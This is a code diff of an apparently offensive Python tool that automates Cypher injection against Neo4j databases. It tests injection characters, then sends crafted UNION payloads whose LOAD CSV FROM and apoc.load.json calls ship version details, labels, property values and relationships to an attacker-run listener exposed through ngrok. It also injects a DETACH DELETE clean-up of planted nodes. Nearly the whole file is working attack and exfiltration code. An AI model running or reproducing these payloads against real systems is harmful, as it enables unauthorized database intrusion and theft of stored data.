@@ -14,6 +14,7 @@ import os
 from tabulate import tabulate
 from pyngrok import ngrok
 from packaging import version
+from termcolor import colored
 
 
 data_queue = queue.Queue()
@@ -32,31 +33,39 @@ def extract_query_params(query_string):
     return {key: value for key, value in matches}
 
 
-def get_data_from_queue(key=None, timeout=5):
+def get_data(timeout=5):
     """
-    Attempts to retrieve data from the global queue within a specified timeout period.
-    
-    Parameters:
-    - key: if specified, returns value (string) instead of parsed_data (dict)
-    - timeout: The maximum time to wait for data, in seconds.
-    
-    Returns:
-    The extracted data if successful, or None if the queue is empty or times out.
+    URL Decode and return value ?data=value
     """
     try:
         data = data_queue.get(timeout=timeout)
         parsed_data = extract_query_params(data)
         # %2520 -> %20 -> <space>
         parsed_data = {unquote(unquote(key)): unquote(unquote(value)) for key, value in parsed_data.items()}
-        if key:
-            value = parsed_data.get(key)
-            return value
-        else:
-            return parsed_data
+        value = parsed_data.get('data')
+        return value
+
 
     except queue.Empty:
-        print("[!] Injection failed, did not receive request from listener. WAF maybe ?")
+        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?"), "red")
         return None
+
+
+def get_parsed_data(timeout=5):
+    """
+    URL Decode and return dictionary {data: ''}
+    """
+    try:
+        data = data_queue.get(timeout=timeout)
+        parsed_data = extract_query_params(data)
+        # %2520 -> %20 -> <space>
+        parsed_data = {unquote(unquote(key)): unquote(unquote(value)) for key, value in parsed_data.items()}
+        return parsed_data
+
+    except queue.Empty:
+        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?"), "red")
+        return None
+
 
 def fully_dynamic_convert_data(original_data):
     """
@@ -191,7 +200,7 @@ class Neo4jInjector:
 
     def inject_payload(self, payload):
         """Inject a crafted payload to the target."""
-        for injection_character in ["-1", "'", "\"", "'})"]:
+        for injection_character in ["1337", "1337'", "1337\"", "1337'})", "1337\"})"]:
             full_payload = f"{injection_character}{payload}"
             encoded_payload = quote(full_payload, safe='')
             url, data = self.prepare_request_data(encoded_payload)
@@ -219,8 +228,6 @@ class Neo4jInjector:
             if response.status_code == 302:
                 print("302 Redirect, Cookies Expired/Invalid ?")
                 sys.exit()
-            elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
-                return response
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
 
@@ -228,7 +235,7 @@ class Neo4jInjector:
 
     def detect_inject(self):
         print("Determining if the target is injectable")
-        injection_characters = ["'", "\"", "-1"]
+        injection_characters = ["1337'", "1337\"", "1337"]
         working_char = ""
         or_case = None
         and_case = None
@@ -258,80 +265,87 @@ class Neo4jInjector:
 
     def exfil_data(self):
 
+        self.exfil_payload = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
+
         print("\n[*] APOC Check [*]")
-        self.inject_payload(f" RETURN 1 as x UNION CALL apoc.load.json('{self.exfil_ip}/?apoc_version=' + apoc.version()) YIELD value RETURN 1337 as x//")
+        self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
 
-        parsed_data = get_data_from_queue()
-        if parsed_data is None:
-            parsed_data = {'apoc_version': False}
+        apoc_version = get_data()
+        if apoc_version is None:
+            apoc_version = False
 
-        nested_dict = {'-': parsed_data}
+        nested_dict = {'-': {'apoc_version': apoc_version}}
         convert_dict_to_table(nested_dict)
 
-        if parsed_data['apoc_version'] != False:
-            apoc_version = parsed_data['apoc_version']
+        if apoc_version != False:
             check_vulnerability(apoc_version)
             option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
             if option == "y":
-                return True
+                self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//" 
             elif option == "n":
                 print("\n[*] Continuing with LOAD CSV [*]")
 
         print("\n[*] Version Check [*]")
-        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?neo4j_version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 1337 as x//")
+        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT replace(name,' ', '%20') as name,version,edition WITH name +':'+version+':'+edition as exfilData {self.exfil_payload}")
 
-        parsed_data = get_data_from_queue()
-        if parsed_data:
-            nested_dict = {'-': parsed_data}
+        version_parts = get_data().split(':')
+        name, version, edition = version_parts[0], version_parts[1], version_parts[2]
+
+        if version_parts:
+            nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
             convert_dict_to_table(nested_dict)
         else:
             print("[!] Not vulnerable")
             sys.exit()
 
-        # dump label count
-        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as label_count LOAD CSV FROM '{self.exfil_ip}/?label_count='+label_count as l RETURN 1337 as x//")
+        if edition == 'enterprise':
+            print(colored("\n[!] Neo4j Enterprise edition is detected, RBAC configuration could be blocking our payload.\n", "yellow"))
 
-        parsed_data = get_data_from_queue()
-        label_count = parsed_data.get('label_count')  # Extract the label value
+        # dump label count
+        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as exfilData {self.exfil_payload}")
+
+        label_count = get_data()
         
         # dump labels
-        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 1337 as x//")
+        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label as exfilData WITH COLLECT(exfilData) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
 
-        # Store labels
-        labels = []
-        for _ in range(int(label_count)):
-            label_value = get_data_from_queue('label')  # Extract the label value
-            labels.append(label_value)
+        labels = get_data().split('::') 
 
-        print(f"\navailable labels [{label_count}]:")
+        print(f"\n[*] available labels [{label_count}]:")
         for label in labels:
-            print(f"[*] {label}")
+            print(f"[+] {label}")
 
+        node_count_list = []
         for label in labels:
             # dump node count
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as l LOAD CSV FROM '{self.exfil_ip}/?node_count='+l as x RETURN 1337 as x//")
-            node_count = get_data_from_queue('node_count')  # Extract the label value
-
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
+            node_count = get_data()  
+            node_count_list.append(node_count)
 
             # Dump property count
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 1337 as x//")
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")
 
-            property_count = get_data_from_queue('property_count')  # Extract the label value
+            property_count = get_data()  
 
             # dump properties
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as joinedString WITH SUBSTRING(joinedString, 0, SIZE(joinedString) - 2) as joinedString LOAD CSV FROM '{self.exfil_ip}/?keys='+replace(joinedString,' ', '%20') as l RETURN 1337 as x//")
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
 
             print(f"\n[*] Label: {label}")
             print(f"[+] available properties [{property_count}]:")
-            properties = get_data_from_queue('keys').split('::')
+            properties = get_data().split('::')
+
             for pr0perty in properties:
                 print(f"[++] {pr0perty}")
 
             properties_dict = {}
             for pr0perty in properties:
-                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as  joinedString WITH SUBSTRING(joinedString, 0, SIZE(joinedString) - 2) as joinedString LOAD CSV FROM '{self.exfil_ip}/?{pr0perty}='+replace(joinedString,' ', '') as l RETURN 1337 as x//")
-                parsed_data = get_data_from_queue()
+                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+                parsed_data = get_parsed_data()
+                # replace key name to pr0perty variable
+                parsed_data[pr0perty] =  parsed_data.pop("data")
+
                 properties_dict.update(parsed_data)
+
             formatted_dict = fully_dynamic_convert_data(properties_dict)
             write_json_to_file(formatted_dict, f'{label}.json')
 
@@ -344,20 +358,20 @@ class Neo4jInjector:
 
         print("\n[*] Using LOAD CSV to Exfiltrate Relationships [*]")
         # dump relationship count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as x LOAD CSV FROM '{self.exfil_ip}/?relationship_count='+x as l RETURN '0xyf' as x//")
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as exfilData {self.exfil_payload}")
 
-        relationship_count = get_data_from_queue('relationship_count')  # Extract the label value
+        relationship_count = get_data()  
 
         if relationship_count is None or relationship_count == '0':
             print("[!] The database might not have any relationships. Exiting...")
             sys.exit()
 
         # dump relationships type
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as joinedString WITH SUBSTRING(joinedString, 0, SIZE(joinedString) - 2) as joinedString LOAD CSV FROM '{self.exfil_ip}/?type='+joinedString as l RETURN '0xyf' as x//")
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
 
         
-        print(f"\nrelationships types [{relationship_count}]:")
-        relationships = get_data_from_queue('type').split('::')
+        print(f"\n[*] relationships types [{relationship_count}]:")
+        relationships = get_data().split('::')
         for relationship in relationships:
             print(f"[+] {relationship}")
 
@@ -366,9 +380,9 @@ class Neo4jInjector:
         counter = 0 
         for rel_type in relationships:
             # Initial payload injection to get relationships list
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS joinedString WITH SUBSTRING(joinedString, 0, SIZE(joinedString) - 2) as joinedString LOAD CSV FROM '{self.exfil_ip}/?relationships=' + joinedString as l RETURN '0xyf' as x //")
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
             
-            relationships_list = get_data_from_queue('relationships').split('::')
+            relationships_list = get_data().split('::')
 
             for relationship in relationships_list:
                 relationship_parts = relationship.split(':')
@@ -376,13 +390,13 @@ class Neo4jInjector:
                 # verify relationship
                 # process each relationship direction
                 for id_from, id_to in [(id1, id2), (id2, id1)]:
-                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 LOAD CSV FROM '{self.exfil_ip}/?relationship=' + label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as l RETURN '0xyf' as x//")
+                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as exfilData {self.exfil_payload}")
                     if not data_queue.empty():
                         counter += 1
-                        relationship = get_data_from_queue('relationship')
+                        relationship = get_data()
                         found_relationships.append(relationship)
             
-        print(f"\navailable relationships [{counter}]")
+        print(f"\n[*] available relationships [{counter}]")
         for rel_type in relationships:
             print(f"[+] {rel_type}")
             for relationship in found_relationships:
@@ -390,120 +404,11 @@ class Neo4jInjector:
                 if regex_rel_type == rel_type:
                     print(f"[++] {relationship}")
 
-    def apoc_exfil_data(self):
-        print("\n[*] Using APOC to Exfiltrate Data [*]")
-
-        print("\n[*] Version Check [*]")
-        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition CALL apoc.load.json('{self.exfil_ip}/?neo4j_version='+version + '&name=' + replace(name,' ','') + 'edition=' + edition + '&apoc_version=' + apoc.version()) YIELD value RETURN 1337 as x//")
-
-        parsed_data = get_data_from_queue()
-        nested_dict = {'-': parsed_data}
-        convert_dict_to_table(nested_dict)
-
-        # dump label count
-        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as l CALL apoc.load.json('{self.exfil_ip}/?label_count='+l) YIELD value RETURN 1337 as x//")
-
-        label_count = get_data_from_queue('label_count')   
-            
-        # dump labels    
-        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() YIELD label WITH DISTINCT label WITH COLLECT(label) as list CALL apoc.load.json('{self.exfil_ip}/?labels='+replace(apoc.text.join(list, '::'),' ', '%20')) YIELD value RETURN 1337 as x//")
-
-        # Store labels
-        print(f"\navailable labels [{label_count}]:")
-        labels = get_data_from_queue('labels').split('::')
-        for label in labels:
-            print(f"[+] {label}")
-
-        for label in labels:
-            # dump node count
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as l CALL apoc.load.json('{self.exfil_ip}/?node_count=' + l) YIELD value RETURN 1337 as x//")
-            node_count = get_data_from_queue('node_count')  # Extract the label value
-            
-
-            # dump property count
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y CALL apoc.load.json('{self.exfil_ip}/?property_count=' + y) YIELD value RETURN 1337 as x//")
-
-            property_count = get_data_from_queue('property_count')  # Extract the label value
-
-            # print("Dumping Properties")
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list CALL apoc.load.json('{self.exfil_ip}/?keys=' + replace(apoc.text.join(list, '::'),' ', '%20')) YIELD value RETURN 1337 as x//")
-
-            print(f"\n[*] Label: {label}")
-            print(f"[+] available properties [{property_count}]:")
-            properties = get_data_from_queue('keys').split('::')
-            for pr0perty in properties:
-                print(f"[++] {pr0perty}")
-
-            properties_dict = {}
-            for pr0perty in properties:
-                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty} WITH COLLECT(DISTINCT(id_{pr0perty})) AS list CALL apoc.load.json('{self.exfil_ip}/?{pr0perty}=' + replace(apoc.text.join(list, '::'),' ', '%20')) YIELD value RETURN 1337 as x//")
-                parsed_data = get_data_from_queue()
-                properties_dict.update(parsed_data)
-
-            formatted_dict = fully_dynamic_convert_data(properties_dict)
-            
-            write_json_to_file(formatted_dict, f'{label}.json')
-
-            print(f"[{node_count} entries]")
-            convert_dict_to_table(formatted_dict)
-
-    def apoc_exfil_relationship(self):
-
-        print("\n[*] Using APOC to Exfiltrate Relationships [*]")
-
-        # dump relationship count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as x CALL apoc.load.json('{self.exfil_ip}/?relationship_count=' + x) YIELD value RETURN 1337 as x//")
-
-        relationship_count = get_data_from_queue('relationship_count')
-
-        if relationship_count is None or relationship_count == '0':
-            print("[!] The database might not have any relationships. Exiting...")
-            sys.exit()
-
-        # dump relationships type
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list CALL apoc.load.json('{self.exfil_ip}/?type=' + replace(apoc.text.join(list, '::'),' ', '%20')) YIELD value RETURN 1337 as x//")
-
-       
-        print(f"\nrelationships types [{relationship_count}]:")
-        relationships = get_data_from_queue('type').split('::')
-        for relationship in relationships:
-            print(f"[+] {relationship}")
-
-        # dump relationships
-        found_relationships = []
-        counter = 0 
-        for rel_type in relationships:
-            # Initial payload injection to get relationships list
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list CALL apoc.load.json('{self.exfil_ip}/?relationships=' + replace(apoc.text.join(list, '::'),' ', '%20')) YIELD value RETURN '0xyf' as x//")
-            relationship = get_data_from_queue('relationships')
-            relationships_list = relationship.split('::')
-            for relationship in relationships_list:
-                relationship_parts = relationship.split(':')
-                id1, rel_type, id2 = relationship_parts[0], relationship_parts[1], relationship_parts[2]
-
-                # verify relationship
-                # process each relationship direction
-
-                for id_from, id_to in [(id1, id2), (id2, id1)]:
-                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 CALL apoc.load.json('{self.exfil_ip}/?relationship=' + label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2)) YIELD value RETURN '0xyf' as x//")
-                    if not data_queue.empty():
-                        counter += 1
-                        # need to decode twice otherwise %3e not converted
-                        relationship = get_data_from_queue('relationship')
-                        found_relationships.append(relationship)
-                    
-
-        print(f"\navailable relationships [{counter}]")
-        for rel_type in relationships:
-            print(f"[+] {rel_type}")
-            for relationship in found_relationships:
-                regex_rel_type = re.findall(r"\[:([^\]]+)\]", relationship)[0]
-                if regex_rel_type == rel_type:
-                    print(f"[++] {relationship}")
 
 
     def clean_up(self):
-        print("[!] Detected an increase in node count, probably injected in a CREATE clause. Do you wish to delete nodes with empty properties. Warning, if there are nodes without properties before injection is done, it will be deleted as well.")
+        self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
+
 
 
 def main():
@@ -544,7 +449,7 @@ def main():
 
     if (args.type == "API"):
         if (injector.detect_inject()):
-            print("Target likely injectable, continuing")
+            print(colored("Target likely injectable, continuing"),"green")
         else:
             if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
                 return
@@ -553,17 +458,9 @@ def main():
 
     # Begin exfiltration process
     
-    apoc_installed = injector.exfil_data()
-    if apoc_installed:
-        injector.apoc_exfil_data()
-        injector.apoc_exfil_relationship()
-    else:
-        injector.exfil_relationship()
-        
-        # dump_hash = input("Do you wish to dump the Neo4j account hash (Y/N)")
-        # if dump_hash == "Y":
-        #     injector.exfil_password()
-
+    injector.exfil_data()
+    injector.exfil_relationship()
+    injector.clean_up()
 
     listener.stop_listener()
     listener_thread.join()
